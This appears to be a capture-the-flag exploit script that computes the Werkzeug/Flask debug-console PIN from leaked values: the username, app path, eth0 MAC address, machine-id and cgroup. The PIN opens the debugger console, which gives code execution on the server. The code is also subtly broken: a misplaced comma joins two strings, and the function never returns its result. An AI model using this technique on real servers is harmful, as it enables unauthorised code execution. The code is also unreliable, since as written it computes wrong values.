import hashlib
from itertools import chain

def solve(username, eth0, machine_id, cgroup):
    probably_public_bits = [
    username,# username ok
    'flask.app', # ok
    'Flask' #ok,
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # ok
]

    private_bits = [
        eth0,# /sys/class/net/eth0/address
        machine_id + cgroup
        # '7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a'# machine-id
        # /etc/machine-id + /proc/self/cgroup
    ]

    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num
